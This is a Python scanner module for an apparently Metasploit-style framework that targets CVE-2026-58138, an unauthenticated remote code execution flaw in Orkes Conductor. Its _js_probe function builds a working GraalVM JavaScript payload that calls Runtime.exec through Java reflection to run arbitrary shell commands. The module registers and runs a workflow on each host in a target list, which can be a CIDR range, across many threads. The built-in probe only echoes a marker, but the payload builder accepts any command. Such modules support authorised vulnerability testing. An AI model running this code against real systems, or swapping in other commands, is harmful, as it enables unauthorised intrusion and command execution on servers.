import json
import secrets
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

def _js_probe(cmd):
    c = cmd.replace("\\", "\\\\").replace("'", "\\'")
    return (
        "var k=$.getClass().getClass();"
        "var S=k.getMethod('getName').getReturnType();"
        "var forName=k.getMethod('forName',S);"
        "var L=function(n){return forName.invoke(null,[n]);};"
        "var RT=L('java.lang.Runtime');"
        "var rt=RT.getMethod('getRuntime').invoke(null,[]);"
        "var I=L('java.lang.Integer').getField('TYPE').get(null);"
        "var A=L('java.lang.reflect.Array');"
        "var arr=A.getMethod('newInstance',k,I).invoke(null,[S,3]);"
        "var set=A.getMethod('set',L('java.lang.Object'),I,L('java.lang.Object'));"
        f"set.invoke(null,[arr,0,'sh']);set.invoke(null,[arr,1,'-c']);set.invoke(null,[arr,2,'{c}']);"
        "var p=RT.getMethod('exec',arr.getClass()).invoke(rt,[arr]);p.waitFor();"
        "var isr=L('java.io.InputStreamReader').getConstructor(L('java.io.InputStream')).newInstance(p.getInputStream());"
        "var br=L('java.io.BufferedReader').getConstructor(L('java.io.Reader')).newInstance(isr);"
        "var o='',l;while((l=br.readLine())!==null)o+=l+'\\n';o"
    )


MARKER = "METIS_CONDUCTOR_8f3a2c"

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""
    output: str = ""

class ConductorInlineRCEScanner(Auxiliary):
    NAME = "Orkes Conductor Unauth RCE Scanner (CVE-2026-58138)"
    DESCRIPTION = (
        "Detects Orkes Conductor / Conductor OSS instances vulnerable to "
        "CVE-2026-58138. Registers a workflow with an INLINE JavaScript task "
        "that abuses unsandboxed GraalVM HostAccess.ALL to invoke Java "
        "reflection and Runtime.exec. Runs 'echo <marker>' to confirm the "
        "vulnerability without executing dangerous commands."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    DISCLOSED = "2026-07-10"
    CHECK = True
    REFERENCES = [
        "CVE-2026-58138",
        "https://orkes.io/",
        "https://github.com/conductor-oss/conductor",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=8080, type=int, description="HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=30.0, type=float, description="per-request timeout"),
        Option("THREADS", default=10, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base_url(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _call(self, host, path, data=None, method=None):
        url = self._base_url(host) + path
        body = json.dumps(data).encode() if data is not None else None
        req = urllib.request.Request(
            url,
            data=body,
            method=method or ("POST" if data is not None else "GET"),
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json,text/plain,*/*",
                "User-Agent": "Mozilla/5.0 (metis)",
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"]) as r:
                raw = r.read().decode(errors="replace")
                try:
                    return r.status, json.loads(raw)
                except ValueError:
                    return r.status, raw
        except urllib.error.HTTPError as e:
            raw = e.read().decode(errors="replace")
            try:
                return e.code, json.loads(raw)
            except ValueError:
                return e.code, raw

    def _probe(self, host):
        marker = "echo " + MARKER
        wf_name = "metis_" + secrets.token_hex(4)

        wfdef = {
            "name": wf_name,
            "version": 1,
            "schemaVersion": 2,
            "ownerEmail": "metis@example.com",
            "tasks": [{
                "name": "probe",
                "taskReferenceName": "probe",
                "type": "INLINE",
                "inputParameters": {
                    "evaluatorType": "javascript",
                    "expression": _js_probe(marker),
                },
            }],
        }

        try:
            st, _ = self._call(host, "/api/metadata/workflow", wfdef)
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", "metadata: " + type(e).__name__)

        if st not in (200, 201, 204):
            return HostResult(host, "safe", "metadata HTTP " + str(st))

        try:
            st, wid = self._call(host, "/api/workflow/" + wf_name, {})
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", "start: " + type(e).__name__)

        if st not in (200, 201):
            return HostResult(host, "safe", "start HTTP " + str(st))

        if not isinstance(wid, str):
            wid = str(wid)

        time.sleep(2)

        try:
            st, info = self._call(host, "/api/workflow/" + wid + "?includeTasks=true")
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", "poll: " + type(e).__name__)

        if st != 200 or not isinstance(info, dict):
            return HostResult(host, "safe", "poll HTTP " + str(st))

        output = None
        for t in (info.get("tasks") or []):
            if t.get("taskType") == "INLINE":
                output = (t.get("outputData") or {}).get("result")
                if output:
                    break

        if not output:
            return HostResult(host, "safe", "no INLINE output")

        text = str(output).strip()

        if MARKER in text:
            return HostResult(host, "vulnerable", "marker echoed", text)

        return HostResult(host, "safe", "output did not contain marker")

    def _record_host_result(self, h):
        svc_name = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name=svc_name, banner="Conductor",
        )
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2026-58138",
            info=h.detail,
        )

    def check(self):
        targets = self._expand_targets()
        host = targets[0]
        print(colors.info("check: probing " + self._base_url(host)))
        print(colors.dimmed("  registering INLINE marker workflow"))

        r = self._probe(host)

        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            if r.output:
                print(colors.dimmed("  output: " + r.output.replace("\n", " | ")[:120]))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info("scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"))
        print(colors.dimmed("  each scan registers and runs a marker INLINE workflow"))

        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if workspace_active:
                            self._record_host_result(r)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                print("    " + colors.vuln(h.host) + "  " + colors.dimmed(h.detail))

        return hits
